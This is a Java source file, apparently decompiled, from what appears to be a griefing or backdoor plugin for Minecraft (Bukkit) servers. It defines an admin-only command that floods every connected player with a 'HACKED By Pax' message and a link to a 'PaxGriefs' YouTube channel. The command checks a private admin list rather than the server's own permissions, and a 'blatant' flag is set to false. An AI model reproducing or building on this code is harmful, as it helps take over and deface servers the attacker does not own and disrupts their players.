package me.qlutch.sucks.command.impl.admin;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class PaxHackedCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.admin.contains(p2.getName())) {
            String paxhacked = "§1§kPax§4§lHACKED §9By §cPax. - §4youtube.com/c/PaxGriefs§1§kPax";
            for (int x2 = 0; x2 <= 20; ++x2) {
                Bukkit.broadcastMessage((String)paxhacked);
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be an " + Settings.RED + "admin " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}
